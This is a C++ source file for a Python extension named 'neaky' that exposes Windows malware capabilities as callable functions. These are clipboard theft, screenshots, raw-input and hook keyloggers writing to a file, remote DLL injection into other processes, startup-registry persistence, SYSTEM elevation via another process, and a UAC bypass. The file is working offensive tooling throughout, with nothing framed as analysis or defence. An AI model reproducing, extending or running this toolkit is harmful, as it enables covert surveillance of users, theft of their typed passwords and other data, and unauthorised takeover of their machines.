#define WIN32_LEAN_AND_MEAN // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#include <windows.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <cstdio>
#include <iostream>
#include <fstream>

#define PY_SSIZE_T_CLEAN
#include <Python.h>

#include <neaky/utils.h>
#include "neakymodule.h"

#include "spy/clipboard.h"
#include "spy/screenshot.h"
#include "spy/keylog.h"
#include "persist/remote_dll_injection.h"
#include "persist/startup.h"
#include "elevate/get_system.h"
#include "elevate/uac_bypass.h"

std::ofstream *ofs; // for keylogger

extern "C"
{

    PyObject *
    neaky_clipboard(PyObject *self, PyObject *args)
    {
        const wchar_t *clip = GetClipboardText();
        if (clip == NULL) {
            return NULL;
        }
        return PyUnicode_FromWideChar(clip, -1);
    }

    PyObject *
    neaky_screenshot(PyObject *self, PyObject *args)
    {
        PyObject *path_obj;

        if (!PyArg_ParseTuple(args, "U", &path_obj))
        {
            return NULL;
        }
        wchar_t *path = PyUnicode_AsWideCharString(path_obj, NULL);

        if (!ScreenShotSave(path))
        {
            PyMem_Free(path);
            return NULL;
        }

        PyMem_Free(path);

        Py_RETURN_NONE;
    }

    // allow partial match
    PyObject *
    neaky_get_pid_by_name(PyObject *self, PyObject *args)
    {
        PyObject *name_obj;
        if (!PyArg_ParseTuple(args, "U", &name_obj))
        {
            return NULL;
        }
        wchar_t *name = PyUnicode_AsWideCharString(name_obj, NULL);
        PyObject *ret = PyLong_FromUnsignedLong(GetPIDByName(name));
        PyMem_Free(name);
        return ret;
    }

    // allow partial match, return list
    PyObject *
    neaky_get_pids_by_name(PyObject *self, PyObject *args)
    {
        PyObject *name_obj;
        if (!PyArg_ParseTuple(args, "U", &name_obj))
        {
            return NULL;
        }
        wchar_t *name = PyUnicode_AsWideCharString(name_obj, NULL);

        DWORD pid = NULL;
        HANDLE hSnapshot = INVALID_HANDLE_VALUE;
        PROCESSENTRY32 pe;
        THREADENTRY32 te;
        PyObject *ret = PyList_New(0);

        pe.dwSize = sizeof(pe);
        te.dwSize = sizeof(te);
        hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

        Process32First(hSnapshot, &pe);
        do
        {
            if (_wcsicmp(name, pe.szExeFile) == 0)
            {
                PyList_Append(ret, PyLong_FromUnsignedLong(pe.th32ProcessID));
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
        CloseHandle(hSnapshot);

        PyMem_Free(name);
        return ret;
    }

    PyObject *
    neaky_remote_thread_injection(PyObject *self, PyObject *args)
    {
        PyObject *path_obj;
        DWORD pid;

        if (!PyArg_ParseTuple(args, "Uk", &path_obj, &pid))
        {
            return NULL;
        }

        wchar_t *dll_path = PyUnicode_AsWideCharString(path_obj, NULL);
        if(InjectDll(pid, dll_path) == FALSE)
        {
            PyMem_Free(dll_path);
            return NULL;
        }
        PyMem_Free(dll_path);
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_set_startup_reg(PyObject *self, PyObject *args)
    {
        PyObject *key_obj;
        PyObject *path_obj;

        if (!PyArg_ParseTuple(args, "UU", &key_obj, &path_obj))
        {
            return NULL;
        }
        
        wchar_t *key = PyUnicode_AsWideCharString(key_obj, NULL);
        wchar_t *path = PyUnicode_AsWideCharString(path_obj, NULL);

        if (SetStratupReg(key, path) == FALSE) {
            PyMem_Free(key);
            PyMem_Free(path);
            return NULL;
        }

        PyMem_Free(key);
        PyMem_Free(path);

        Py_RETURN_NONE;
    }

    PyObject *
    neaky_delete_startup_reg(PyObject *self, PyObject *args)
    {
        PyObject *key_obj;

        if (!PyArg_ParseTuple(args, "U", &key_obj))
        {
            return NULL;
        }
        wchar_t *key = PyUnicode_AsWideCharString(key_obj, NULL);
        
        if (DeleteStratupReg(key) == FALSE) {
            PyMem_Free(key);
            return NULL;
        }

        PyMem_Free(key);

        Py_RETURN_NONE;
    }

    PyObject *
    neaky_keylog_stdout(PyObject *self, PyObject *args)
    {
        if (RawInputKeyLogger.KeyLoggerInit(&std::cout) == FALSE)
        {
            return NULL;
        }
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_hook_keylog_stdout(PyObject *self, PyObject *args)
    {
        if (HookKeyLogger.KeyLoggerInit(&std::cout) == FALSE)
        {
            return NULL;
        }
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_hook_keylog_stop(PyObject *self, PyObject *args)
    {
        HookKeyLogger.KeyLoggerFini();
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_keylog_to_file(PyObject *self, PyObject *args)
    {
        PyObject *path_obj = NULL;
        if (!PyArg_ParseTuple(args, "O&", PyUnicode_FSConverter, &path_obj))
        {
            return NULL;
        }
        const char *path = PyBytes_AsString(path_obj);
        if (ofs)
        {
            if ((*ofs).is_open())
            {
                (*ofs).close();
            }
        }
        else
        {
            ofs = new std::ofstream();
        }
        (*ofs).open(path);

        if (RawInputKeyLogger.KeyLoggerInit(ofs) == FALSE)
        {
            return NULL;
        }
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_keylog_stop(PyObject *self, PyObject *args)
    {
        RawInputKeyLogger.KeyLoggerFini();
        if (ofs)
        {
            if ((*ofs).is_open())
            {
                (*ofs).close();
            }
        }
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_message_loop(PyObject *self, PyObject *args)
    {
        MSG msg;

        // releases GIL
        Py_BEGIN_ALLOW_THREADS

        while (GetMessage(&msg, nullptr, 0, 0))
        {
            // puts(".");
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Py_END_ALLOW_THREADS

        Py_RETURN_NONE;
    }

    PyObject *
    neaky_get_username(PyObject *self, PyObject *args)
    {
        TCHAR username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;
        GetUserName(username, &username_len);
        return Py_BuildValue("u", username);
    }

    PyObject *
    neaky_elevate_thread(PyObject *self, PyObject *args)
    {
        DWORD pid;
        char *error;

        if (!PyArg_ParseTuple(args, "k", &pid))
        {
            PyErr_Clear();
            error = ElevateSelf();
        }
        else
        {
            error = ElevateSelf(pid);
        }

        if (error != NULL)
        {
            PyErr_SetString(NeakyError, error);
            return NULL;
        }
        Py_RETURN_NONE;
    }

    PyObject *
    neaky_elevate_execute(PyObject *self, PyObject *args)
    {
        PyObject *exe_path_obj;
        PyObject *cmd_obj;

        DWORD pid = 0;
        char *error;

        if (!PyArg_ParseTuple(args, "UU|k", &exe_path_obj, &cmd_obj, &pid))
        {
            return NULL;
        }

        wchar_t *exe_path = PyUnicode_AsWideCharString(exe_path_obj, NULL);
        wchar_t *cmd = PyUnicode_AsWideCharString(cmd_obj, NULL);

        if (pid == 0)
        {
            error = ElevatedExecute(exe_path, cmd);
        }
        else
        {
            error = ElevatedExecute(pid, exe_path, cmd);
        }

        if (error != NULL)
        {
            PyMem_Free(exe_path);
            PyMem_Free(cmd);

            PyErr_SetString(NeakyError, error);
            return NULL;
        }

        PyMem_Free(exe_path);
        PyMem_Free(cmd);

        Py_RETURN_NONE;
    }

    PyObject *
    neaky_bypass_uac_exec(PyObject *self, PyObject *args)
    {
        PyObject *exe_path_obj;
        PyObject *cmd_obj;

        if (!PyArg_ParseTuple(args, "UU", &exe_path_obj, &cmd_obj))
        {
            return NULL;
        }

        wchar_t *exe_path = PyUnicode_AsWideCharString(exe_path_obj, NULL);
        wchar_t *cmd = PyUnicode_AsWideCharString(cmd_obj, NULL);

        if (BypassUAC(exe_path, cmd) == FALSE)
        {
            PyMem_Free(exe_path);
            PyMem_Free(cmd);
            return NULL;
        }

        PyMem_Free(exe_path);
        PyMem_Free(cmd);

        Py_RETURN_NONE;
    }

}
